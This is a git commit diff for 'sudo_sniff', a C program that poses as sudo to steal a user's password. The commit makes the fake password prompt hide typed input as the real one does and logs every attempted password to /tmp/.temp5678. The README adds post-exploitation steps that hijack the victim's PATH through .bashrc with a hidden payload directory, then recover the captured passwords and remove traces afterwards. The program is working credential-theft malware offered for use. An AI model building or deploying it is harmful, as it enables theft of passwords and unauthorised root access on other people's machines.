9ca34b5c3342eea60620e7f93ec5fc7218037026
mjdubell <localhost@localhost>
2016-08-19 01:51:02 +0200

    Victim's input is now hidden. Updated README

--- README.md
+++ README.md
@@ -1,17 +1,42 @@
 # sudo_sniff
-sudo_sniff is a simple program that attempts to steal the user's password while running sudo without arousing any suspicion. The idea is to first modify the user's $PATH with `PATH="$HOME/.bin:$PATH"` and placing sudo_sniff in `$HOME/.bin/sudo`. This could be used in post-exploitation.
+**sudo\_sniff** is a simple program that attempts to steal the user's password while running sudo without arousing any suspicion. The idea is to modify the user's `$PATH` in order to hijack sudo when executed by the user. This could be used in post-exploitation as an alternative route for acheiving root acces (given that the user has the correct permissions).
+
+**sudo_sniff** will store both correct and incorrect password entries at the following location per default: `/tmp/.temp5678`
 
 ## Improvements
-* Hide the victim's input
+* ~~Hide the victim's input~~
 * ~~Add function to either send the password to attacker or save it on disk.~~
 * sudo may be in different locations on different systems, perhaps implement a function to locate it
 * ~~[BUG] When the victim enters his input, the text asking for the password will be printed multiple times.~~
 
 ## Usage
-1. git clone git@github.com:mjdubell/sudo_sniff.git
-2. cd sudo_sniff/
-3. make
-4. ./sudo whoami
+```
+hunter@nsa:~$ git clone git@github.com:mjdubell/sudo_sniff.git
+hunter@nsa:~$ cd sudo_sniff/
+hunter@nsa:~$ make
+hunter@nsa:~$ ./sudo whoami
+```
+
+#### Post Exploitation
+```
+victim@server:~$ mkdir $HOME/.payload
+victim@server:~$ gcc -Wall -g -o $HOME/.payload/sudo sudo_sniff.c
+victim@server:~$ echo 'export PATH="$HOME/.payload:$PATH"' >> $HOME/.bashrc
+```
+*Note: Make sure `sudo` is executable.*
+
+##### Cleanup
+```
+victim@server:~$ rm -rf $HOME/.payload; rm /tmp/.temp5678; sed '/export PATH="$HOME\/\.payload:$PATH"/d' .bashrc > tmp && mv tmp .bashrc
+```
+*Note: Running `history` will reveal the cleanup command*
+
+##### Retrieve the password
+```
+victim@server:~$ cat /tmp/.temp5678
+victim:mypasword:ERROR
+victim:mypassword:SUCCESS
+```
 
 ## Contributing
 1. Fork it!
--- sudo_sniff.c
+++ sudo_sniff.c
@@ -4,10 +4,12 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <pwd.h>
+#include <termios.h>
+#include <stdio.h>
 
 #define BUFFER_SIZE  100
 #define MAX_PW_ATTEMPTS  3
-
+#define DEFAULT_LOCATION "/tmp/.temp5678"
 
 /* save_password()
 *  Writes the username, supplied password by the victim and status to disk.
@@ -20,17 +22,17 @@
 */
 int save_password(char *username, char *password, char *status)
 {
-	char text[BUFFER_SIZE] = {0};
-	snprintf(text, sizeof(text), "%s:%s:%s\n", username, password, status);
+    char text[BUFFER_SIZE] = {0};
+    snprintf(text, sizeof(text), "%s:%s:%s\n", username, password, status);
 
-	FILE *fp;
-	fp = fopen("/tmp/.temp5678", "a+");
-	if (fp != NULL)
-	{
-		fwrite(text, 1, sizeof(text), fp);
-	}
-	fclose(fp);
-	return 0;
+    FILE *fp;
+    fp = fopen(DEFAULT_LOCATION, "a+");
+    if (fp != NULL)
+    {
+        fwrite(text, 1, sizeof(text), fp);
+    }
+    fclose(fp);
+    return 0;
 }
 
 /* basic_sudo()
@@ -40,12 +42,12 @@ int save_password(char *username, char *password, char *status)
 *
 */
 int basic_sudo(char *arguments) {
-	/* Contains the victim's original command */
-	char orgiginal_cmd[BUFFER_SIZE] = {0};
+    /* Contains the victim's original command */
+    char orgiginal_cmd[BUFFER_SIZE] = {0};
 
-	snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "/usr/bin/sudo%s", arguments);
-	system(orgiginal_cmd);
-	return 0;
+    snprintf(orgiginal_cmd, sizeof(orgiginal_cmd), "/usr/bin/sudo%s", arguments);
+    system(orgiginal_cmd);
+    return 0;
 }
 
 /* check_sudo()
@@ -53,73 +55,114 @@ int basic_sudo(char *arguments) {
 *  system() returns 256 on error which indicates no sudo access.
 *
 *  Returns: 0 if user does not have sudo access
-*			1 if the user has sudo access
+*           1 if the user has sudo access
 */
 int check_sudo() {
-	int ret;
-	ret = system("/usr/bin/sudo -n true 2>/dev/null");
-	if (ret == 256) {
-		return 0;
-	} else {
-		return 1;
-	}
+    int ret;
+    ret = system("/usr/bin/sudo -n true 2>/dev/null");
+    if (ret == 256) {
+        return 0;
+    } else {
+        return 1;
+    }
+}
+
+/* get_user_pass()
+*  Gets the victim's password and hides the input in the terminal just like sudo.
+*  Same arguments as getline().
+*
+*  getline() reads an entire line from stream, storing the address of
+*  the buffer containing the text into *lineptr.  The buffer is null-
+*  terminated and includes the newline character, if one was found.
+*
+*  If *lineptr is set to NULL and *n is set 0 before the call, then
+*  getline() will allocate a buffer for storing the line.  This buffer
+*  should be freed by the user program even if getline() failed." 
+*
+*/
+ssize_t get_user_pass(char **lineptr, size_t *n, FILE *stream)
+{
+    struct termios old, new;
+    int nread;
+
+    /* Turn echoing off and fail if we can’t. */
+    if (tcgetattr (fileno (stream), &old) != 0)
+        return -1;
+    new = old;
+    new.c_lflag &= ~ECHO;
+    if (tcsetattr (fileno (stream), TCSAFLUSH, &new) != 0)
+        return -1;
+
+    /* Read the password. */
+    nread = getline (lineptr, n, stream);
+
+    /* Restore terminal. */
+    (void) tcsetattr (fileno (stream), TCSAFLUSH, &old);
+
+    return nread;
 }
 
 int main(int argc, char const *argv[])
 {
-	struct passwd *usr = getpwuid(getuid());
-	/* Contains the password for sudo access */
-	char *password = NULL;
-	/* The victim's intital parameters to run sudo with */
-	char arguments[BUFFER_SIZE] = {0};
-	/* Full command to trick the victim into beleiving sudo ran successfully */
-	char command[BUFFER_SIZE] = {0};
+    struct passwd *usr = getpwuid(getuid());
+    /* Contains the password for sudo access */
+    char *password = NULL;
+    /* The victim's intital parameters to run sudo with */
+    char arguments[BUFFER_SIZE] = {0};
+    /* Full command to trick the victim into beleiving sudo ran successfully */
+    char command[BUFFER_SIZE] = {0};
 
-	size_t len = 0;
-	ssize_t read;
-	int args;
-	int pw_attempts = 1;
+    size_t len = 0;
+    int args;
+    int pw_attempts = 1;
 
-	/* Gather all the arguments supplied by the user and store them in a buffer */
-	for (args = 1; args < argc; ++args) {
-		snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[args]);
-	}
+    /* Gather all the arguments supplied by the user and store them in a buffer */
+    for (args = 1; args < argc; ++args) {
+        snprintf(arguments+strlen(arguments), sizeof(arguments)-strlen(arguments), " %s", argv[args]);
+    }
 
-	/* If we managed to get the current user, attempt to steal his password by faking sudo */
-	if(usr) {
-		/* Check if user already has sudo access */
-		if (!check_sudo()) {
-			while(pw_attempts <= MAX_PW_ATTEMPTS) {
-				printf("[sudo] password for %s: ", usr->pw_name);
-				
-				if((read = getline(&password, &len, stdin))) {
-					// Remove the \n at the end of the password, otherwise it messes up the command
-					password[strlen(password)-1] = '\0';
-					snprintf(command, sizeof(command), "echo %s | /usr/bin/sudo -S%s 2>/dev/null", password, arguments);
+    /* If we managed to get the current user, attempt to steal his password by faking sudo */
+    if(usr) {
+        /* Check if user already has sudo access */
+        if (!check_sudo()) {
+            /* Check if the victim supplied any arguments, if not simply run sudo */
+            if (argc != 1) {
+                while(pw_attempts <= MAX_PW_ATTEMPTS) {
+                    printf("[sudo] password for %s: ", usr->pw_name);
+                    get_user_pass(&password, &len, stdin);
 
-					/* Check if victim entered the correct password. system() weirdly returns 256 on error */
-					if((system(command)) == 256) {
-						printf("Sorry, try again.\n");
-						save_password(usr->pw_name, password, "ERROR");
-					} else {
-						save_password(usr->pw_name, password, "SUCCESS");
-						break;
-					}
-				}
+                    /* Remove the \n at the end of the password, otherwise it messes up the command */
+                    if(password[strlen(password)-1] == '\n') password[strlen(password)-1] = '\0';                 
+                    
+                    /* Build the full command to be executed */
+                    snprintf(command, sizeof(command), "echo %s | /usr/bin/sudo -S%s 2>/dev/null", password, arguments);
+                    printf("\n");
+                    /* Check if victim entered the correct password. system() weirdly returns 256 on error */
+                    if((system(command)) == 256) {
+                        printf("Sorry, try again.\n");
+                        save_password(usr->pw_name, password, "ERROR");
+                    } else {
+                        save_password(usr->pw_name, password, "SUCCESS");
+                        break;
+                    }
 
-				if (pw_attempts == MAX_PW_ATTEMPTS) {
-					printf("sudo: %d incorrect password attempts\n", MAX_PW_ATTEMPTS);
-				}
-				pw_attempts++;
-			}
-			free(password);
+                    /* Give the victim MAX_PW_ATTEMPTS attempts to enter his password */
+                    if (pw_attempts == MAX_PW_ATTEMPTS) {
+                        printf("sudo: %d incorrect password attempts\n", MAX_PW_ATTEMPTS);
+                    }
 
-		} else {
-			basic_sudo(arguments);
-		}
+                    pw_attempts++;
+                }
 
-	} else {
-		basic_sudo(arguments);
-	}
-	return 0;
+                free(password);
+            } else {
+                basic_sudo("");
+            }
+        } else {
+            basic_sudo(arguments);
+        }
+    } else {
+        basic_sudo(arguments);
+    }
+    return 0;
 }
